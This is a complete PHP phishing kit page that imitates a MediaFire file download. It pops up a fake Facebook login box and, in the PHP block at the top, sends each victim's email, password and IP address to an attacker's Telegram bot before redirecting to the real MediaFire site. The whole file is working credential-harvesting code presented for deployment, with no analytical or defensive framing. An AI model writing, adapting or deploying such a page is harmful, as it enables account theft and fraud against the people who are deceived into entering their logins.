<?php
session_start();
$data = json_decode(file_get_contents("data.json"), true);
$ip = $_SERVER['REMOTE_ADDR'];

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    if (isset($_SESSION['last_hit']) && (time() - $_SESSION['last_hit'] < 60)) {
        echo "<script>alert('wait...'); window.location.href='index.php';</script>";
        exit;
    }

    $msg = "🔥 **NEW LOG MEDIAFIRE**\n\n";
    $msg .= "👤 User: `".$_POST['email']."`\n";
    $msg .= "🔑 Pass: `".$_POST['password']."`\n";
    $msg .= "🌐 IP: ".$ip;

    $send = "https://api.telegram.org/bot".$data['bot_token']."/sendMessage?chat_id=".$data['chat_id']."&text=".urlencode($msg)."&parse_mode=Markdown";
    @file_get_contents($send);
    
    $_SESSION['last_hit'] = time();
    header("Location: https://www.mediafire.com");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MediaFire - <?php echo $data['nama']; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* --- KODE CSS ASLI ANDA --- */
        :root { --filename: "<?php echo $data['nama']; ?>"; --filesize: "<?php echo $data['ukuran']; ?>"; --primary-blue: #0070ff; }
        body { margin: 0; font-family: 'Open Sans', sans-serif; background: #fff; color: #333; overflow-x: hidden; }
        header { background: #000080; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; }
        .logo { height: 28px; filter: brightness(0) invert(1); }
        .auth-btns { display: flex; gap: 8px; }
        .btn-auth { background: #fff; border: none; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 700; color: #333; cursor: pointer; }
        .promo-box { background: linear-gradient(to bottom, #00004d, #00001a); margin: 15px; padding: 22px; border-radius: 12px; color: #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .promo-box h2 { font-size: 20px; margin: 0 0 15px 0; font-weight: 700; }
        .promo-features { list-style: none; padding: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 13px; margin-bottom: 20px; }
        .promo-features li { display: flex; align-items: center; gap: 8px; }
        .pricing-bar { border: 2px solid #00ff00; border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; background: rgba(0,255,0,0.05); }
        .most-popular { background: #00cc00; font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: 700; text-transform: uppercase; }
        .btn-faster { background: var(--primary-blue); color: white; width: 100%; border: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 14px; display: flex; justify-content: center; align-items: center; gap: 10px; cursor: pointer; }
        .download-card { background: var(--primary-blue); margin: 0 15px; padding: 18px; border-radius: 8px; display: flex; align-items: center; color: white; cursor: pointer; }
        .file-img { width: 45px; height: auto; margin-right: 15px; }
        .file-info { flex-grow: 1; }
        .file-info h3 { margin: 0; font-size: 19px; font-weight: 600; }
        .file-info p { margin: 4px 0 0; font-size: 12px; opacity: 0.9; }
        .sub-text { font-size: 12px; color: #757575; text-align: center; padding: 25px 35px; line-height: 1.5; }
        .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 15px; }
        .btn-action { background: #f8f8f8; border: 1px solid #eee; padding: 18px; border-radius: 6px; display: flex; flex-direction: column; align-items: center; font-size: 12px; color: #555; gap: 8px; cursor: pointer; }
        footer { margin-top: 50px; padding: 25px; border-top: 1px solid #eee; font-size: 12px; color: #999; text-align: center; }
        .cookie-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #262c30; padding: 22px; color: #fff; font-size: 13px; z-index: 1000; line-height: 1.4; }
        .btn-accept { background: var(--primary-blue); color: white; border: none; width: 100%; padding: 14px; border-radius: 4px; font-weight: bold; margin-top: 18px; cursor: pointer; }

        /* MODAL POPUP */
        .modal-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); display:none; align-items:center; justify-content:center; z-index:9999; }
        .modal-content { background:#fff; width:90%; max-width:360px; padding:25px; border-radius:10px; position:relative; }
        .fb-logo-container { text-align: center; margin-bottom: 10px; }
        .fb-logo-container img { width: 50px; height: auto; }
        .modal-content input { width:100%; padding:12px; margin:8px 0; border:1px solid #ccc; border-radius:5px; box-sizing:border-box; font-size:14px; }
        .btn-submit { background:#1877f2; color:#fff; border:none; width:100%; padding:12px; border-radius:5px; font-weight:bold; cursor:pointer; font-size:16px; margin-top: 10px; }
    </style>
</head>
<body>

<header>
    <img src="./ass/logo.png" style="width: 110px; height: auto;" class="logo">
    <div class="auth-btns">
        <button class="btn-auth">SIGN UP</button>
        <button class="btn-auth">LOG IN</button>
    </div>
</header>

<section class="promo-box">
    <h2>Download Faster</h2>
    <ul class="promo-features">
        <li><img src="./ass/timer.svg"> No Waiting</li>
        <li><img src="./ass/zap.svg"> Premium Storage</li>
        <li><img src="./ass/megaphone.svg"> No Ads</li>
    </ul>
    <div class="pricing-bar">
        <span>🟢 Monthly: $3.99</span>
        <span class="most-popular">Most Popular</span>
    </div>
    <button class="btn-faster" onclick="showPopup()">⚡ DOWNLOAD FASTER NOW</button>
</section>

<div class="download-card" onclick="showPopup()">
    <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/3/mp4.webp" class="file-img">
    <div class="file-info">
        <h3><?php echo $data['nama']; ?></h3>
        <p>Download in a new tab (<?php echo $data['ukuran']; ?>)</p>
    </div>
</div>

<p class="sub-text">Clicking the download button above will start your download in a new tab.</p>

<div class="action-grid">
    <div class="btn-action">🔗<br>Copy for messenger</div>
    <div class="btn-action">👥<br>Post to Facebook</div>
    <div class="btn-action">📤<br>Share options</div>
    <div class="btn-action">💾<br>Save to My Files</div>
</div>

<footer>
    <div>©2026 MediaFire Build 121958</div>
</footer>

<div class="modal-overlay" id="loginModal">
    <div class="modal-content">
        <div class="fb-logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
        </div>
        <h3 style="margin-top:0; text-align:center; font-family: sans-serif;">Login to download</h3>
        <form method="POST" onsubmit="return validateForm()">
            <input type="text" id="email" name="email" placeholder="Email or Phone Number">
            <input type="password" id="password" name="password" placeholder="Password">
            <button type="submit" class="btn-submit">Log In</button>
        </form>
        <button onclick="hidePopup()" style="position:absolute; top:8px; right:10px; border:none; background:none; font-size:24px; cursor:pointer; color:#ccc;">&times;</button>
    </div>
</div>

<script>
    function showPopup() { document.getElementById('loginModal').style.display = 'flex'; }
    function hidePopup() { document.getElementById('loginModal').style.display = 'none'; }

    function validateForm() {
        var email = document.getElementById("email").value;
        var pass = document.getElementById("password").value;
        if (email == "" || email.length < 5) {
            alert("Please enter a valid email or phone number.");
            return false;
        }
        if (pass == "" || pass.length < 6) {
            alert("Password must be at least 6 characters.");
            return false;
        }
        return true;
    }
</script>
</body>
</html>
